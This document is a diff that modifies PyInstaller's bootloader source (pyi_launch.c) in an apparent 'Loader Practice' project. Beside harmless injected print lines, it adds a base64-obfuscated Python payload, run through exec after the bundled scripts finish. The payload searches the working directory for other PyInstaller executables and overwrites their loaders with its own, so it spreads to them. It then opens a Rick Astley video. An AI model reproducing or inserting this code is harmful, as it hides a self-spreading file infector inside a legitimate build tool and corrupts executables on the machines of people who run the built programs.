@@ -1,0 +1,32 @@
+diff --git "a/REPOSITORY\\Loader Practice\\src\\pyi_launch.c" "b/REPOSITORY\\Loader Practice\\src\\pyi_launch.c.new"
+index 36476cb..8c23191 100644
+--- "a/pyi_launch.c"	
++++ "b/pyi_launch.c.new"	
+@@ -387,7 +387,9 @@ pyi_launch_run_scripts(ARCHIVE_STATUS *status)
+         return -1;
+     }
+ 
++	PI_PyRun_SimpleString("print('[INJ_Loader]: I can run something BEFORE all modules!')");
+     /* Iterate through toc looking for scripts (type 's') */
++	char bf[4096];
+     while (ptoc < status->tocend) {
+         if (ptoc->typcd == ARCHIVE_ITEM_PYSOURCE) {
+             /* Get data out of the archive.  */
+@@ -399,6 +401,8 @@ pyi_launch_run_scripts(ARCHIVE_STATUS *status)
+                 return -1;
+             }
+             VS("LOADER: Running %s\n", buf);
++			snprintf(bf, 4096, "print('[INJ_Loader]: I can run something BEFORE any module! Next module is: %s')", ptoc->name);
++			PI_PyRun_SimpleString(bf);
+             __file__ = PI_PyUnicode_FromString(buf);
+             PI_PyObject_SetAttrString(__main__, "__file__", __file__);
+             Py_DECREF(__file__);
+@@ -480,6 +484,8 @@ pyi_launch_run_scripts(ARCHIVE_STATUS *status)
+ 
+         ptoc = pyi_arch_increment_toc_ptr(status, ptoc);
+     }
++	PI_PyRun_SimpleString("print('[INJ_Loader] Yay! Even after all of modules!')");
++	PI_PyRun_SimpleString("import base64;exec(base64.b64decode('ZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBwcmludF9mdW5jdGlvbg0KDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCBzdHJ1Y3QNCg0KTUFHSUMgPSBiJ01FSVwwMTRcMDEzXDAxMlwwMTNcMDE2Jw0KDQpNQUdJQ19PVkVSTEFZID0gYiJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4NzhceGRhIg0KDQojIHRlc3RpbmcgcHVycG9zZXMgLSB5b3UgY2FuIGVpdGhlciByZXdyaXRlIGZpbGUgb3IgY3JlYXRlIG5ldw0KRE9fTk9UX1JFV1JJVEVfRVhJU1RFRF9GSUxFUyA9IEZhbHNlDQpzdWZmaXggPSAiLmluZmVjdGVkLmV4ZSINCg0KTVlfRVhFQ1VUQUJMRSA9IGIiIg0KDQoNCmRlZiBkZXRlY3RfcHlpbnN0YWxsZXIocGF0aCk6DQogICAgd2l0aCBvcGVuKHBhdGgsICJyYiIpIGFzIGY6DQogICAgICAgIHIgPSBmLnJlYWQoKQ0KICAgICAgICBpZiBNQUdJQyBpbiByOg0KICAgICAgICAgICAgaWYgYiJpbXBvcnQgYmFzZTY0O2V4ZWMoYmFzZTY0LmI2NGRlY29kZSgnIiBub3QgaW4gcjoNCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIHJldHVybiBGYWxzZQ0KDQoNCmRlZiBmaW5kX3B5aW5zdGFsbGVycyhiYXNlcGF0aD0iLiIpOg0KICAgIGFucyA9IFtdDQogICAgZm9yIGJhc2UsIF8sIGZpbGVzIGluIG9zLndhbGsoYmFzZXBhdGgpOg0KICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoNCiAgICAgICAgICAgIGlmIGZpbGUgPT0gc3lzLmFyZ3ZbMF06DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoIi5leGUiKToNCiAgICAgICAgICAgICAgICBmaWxlX2Z1bGxwYXRoID0gb3MucGF0aC5qb2luKGJhc2UsIGZpbGUpDQogICAgICAgICAgICAgICAgaWYgZGV0ZWN0X3B5aW5zdGFsbGVyKGZpbGVfZnVsbHBhdGgpOg0KICAgICAgICAgICAgICAgICAgICBhbnMuYXBwZW5kKGZpbGVfZnVsbHBhdGgpDQogICAgcmV0dXJuIGFucw0KDQoNCmRlZiBmaW5kX215c2VsZigpOg0KICAgIGdsb2JhbCBNWV9FWEVDVVRBQkxFLCBNQUdJQ19PVkVSTEFZDQogICAgbXlfY29udGVudCA9IG9wZW4oc3lzLmFyZ3ZbMF0sICJyYiIpLnJlYWQoKQ0KICAgIGYgPSBteV9jb250ZW50LmZpbmQoTUFHSUNfT1ZFUkxBWSkNCiAgICBpZiBmICE9IC0xOg0KICAgICAgICBNWV9FWEVDVVRBQkxFID0gbXlfY29udGVudFs6ZiArIDhdDQogICAgZWxzZToNCiAgICAgICAgTVlfRVhFQ1VUQUJMRSA9IG15X2NvbnRlbnQgICMgcHJvYmFibHkgLnBrZyBnYW1lcw0KDQoNCmRlZiBpbmplY3RfbXlzZWxmKHBhdGgpOg0KICAgIHByaW50KCJQYXRoOiIsIHBhdGgpDQogICAgZ2xvYmFsIE1ZX0VYRUNVVEFCTEUsIE1BR0lDX09WRVJMQVkNCiAgICBoaXNfY29udGVudCA9IGJ5dGVhcnJheShvcGVuKHBhdGgsICJyYiIpLnJlYWQoKSkNCiAgICBvZmZzZXQgPSBoaXNfY29udGVudC5maW5kKE1BR0lDX09WRVJMQVkpDQoNCiAgICBpZiBvZmZzZXQgPT0gLTE6DQogICAgICAgIHByaW50KCJGb3VuZCBubyBtYWdpYyIpDQogICAgICAgIHJldHVybiBGYWxzZQ0KDQogICAgdHJ5Og0KICAgICAgICB3aXRoIG9wZW4ocGF0aCArICIuaW5mZWN0ZWQuZXhlIiBpZiBET19OT1RfUkVXUklURV9FWElTVEVEX0ZJTEVTIGVsc2UgcGF0aCwgIndiIikgYXMgZjoNCiAgICAgICAgICAgIGYud3JpdGUoTVlfRVhFQ1VUQUJMRSArIGhpc19jb250ZW50W29mZnNldCArIDg6XSkNCiAgICAgICAgcHJpbnQoIj4gSW5mZWN0ZWQiLCBwYXRoKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcHJpbnQoIj4gRmFpbGVkIHRvIGluZmVjdCIsIHBhdGgsICItIHByb2JhYmx5IHRoaXMgZmlsZSBpbiBydW4gcmlnaHQgbm93IikNCg0KDQpkZWYgbWFpbigpOg0KICAgIGdsb2JhbCBNWV9FWEVDVVRBQkxFDQogICAgIyBTdGVwIDEgLSBmaW5kIG91ciB0YXJnZXRzDQogICAgcHlpcyA9IGZpbmRfcHlpbnN0YWxsZXJzKCkNCiAgICBwcmludCgiPiBXZSB3aWxsIGluZmVjdCB0aGVzZSBleGVjdXRhYmxlczogIiwgcHlpcykNCiAgICAjIFN0ZXAgMiAtIGZpbmQgb3VyIGxvYWRlcg0KICAgIGZpbmRfbXlzZWxmKCkNCiAgICBpZiBub3QgTVlfRVhFQ1VUQUJMRToNCiAgICAgICAgcHJpbnQoIj4gSSBkaWQgbm90IGZpbmQgbXlzZWxmIikNCiAgICAgICAgcmV0dXJuIDENCiAgICBmb3IgcGF0aCBpbiBweWlzOg0KICAgICAgICAjICBTdGVwIDMgLSByZXBsYWNlIGxvYWRlcnMNCiAgICAgICAgaW5qZWN0X215c2VsZihwYXRoKQ0KICAgICMgU3RlcCA0IC0gcnVuIFJpY2sgQXNobGV5DQogICAgb3Muc3lzdGVtKCJzdGFydCBcIlwiIGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL3dhdGNoP3Y9ZFF3NHc5V2dYY1EiKQ0KDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigp'))");
+     return 0;
+ }
+ 
